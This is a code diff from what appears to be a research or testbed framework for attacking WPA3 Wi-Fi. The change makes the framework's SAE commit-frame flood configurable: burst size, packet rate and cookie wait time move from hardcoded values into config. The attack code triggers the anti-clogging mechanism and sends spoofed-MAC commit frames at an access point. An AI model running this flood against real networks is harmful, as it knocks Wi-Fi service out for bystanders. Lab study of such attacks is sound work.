@@ -93,15 +93,11 @@ pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, con
 	throw run_err("ACM not activated after " + to_string(trigger_count) + " frames");
 }
 
-
 void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac, CookieStore &store,
-						const int attack_time_sec, const dos_helpers::SAEPair &sae_params
+	const int attack_time_sec, const dos_helpers::SAEPair &sae_params,
+	const size_t burst_size, const size_t packets_per_second_limit, const int cookie_wait_ms
 ){
 	PacketSender sender(iface);
-	// TODO get from config
-	constexpr size_t burst_size = 128;
-	constexpr size_t packets_per_second_limit = 500;
-
 	log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
 	dos_helpers::timed_burst(sender, attack_time_sec, burst_size, packets_per_second_limit,
 	[&]() -> optional<RadioTap>{
@@ -116,7 +112,7 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 		}
 
 		if(!entry){
-			this_thread::sleep_for(milliseconds(50)); //TODO hardcoded
+			this_thread::sleep_for(milliseconds(cookie_wait_ms));
 			auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(sta_mac)), sae_params);
 			sender.send(frame);
 			return nullopt;
@@ -138,8 +134,11 @@ void run_attack(RunStatus &rs){
 	const string sniff_iface = attacker["sniff_iface"];
 
 	const auto &att_cfg = rs.config().at("attack_config");
-	const int trigger_count = att_cfg.at("acm_trigger_count").get<int>();
-	const int attack_time = att_cfg.at("attack_time_sec").get<int>();
+	const int trigger_count           = att_cfg.at("acm_trigger_count").get<int>();
+	const int attack_time             = att_cfg.at("attack_time_sec").get<int>();
+	const size_t burst_size           = att_cfg.at("burst_size").get<size_t>();
+	const size_t packets_per_sec      = att_cfg.at("packets_per_second_limit").get<size_t>();
+	const int cookie_wait_ms          = att_cfg.at("cookie_wait_ms").get<int>();
 
 	const auto ssid = rs.config().at("actors").at("access_point").at("setup").at("program_config").at("ssid").get<
 		string>();
@@ -162,7 +161,8 @@ void run_attack(RunStatus &rs){
 	});
 
 	try{
-		burst_with_cookies(iface, attacker["mac"], ap_mac, store, attack_time, sae_params.value());
+		burst_with_cookies(iface, attacker["mac"], ap_mac, store, attack_time, sae_params.value(),
+						   burst_size, packets_per_sec, cookie_wait_ms);
 	} catch(...){
 		store.stop.store(true);
 		if(capture_thread.joinable()) capture_thread.join();
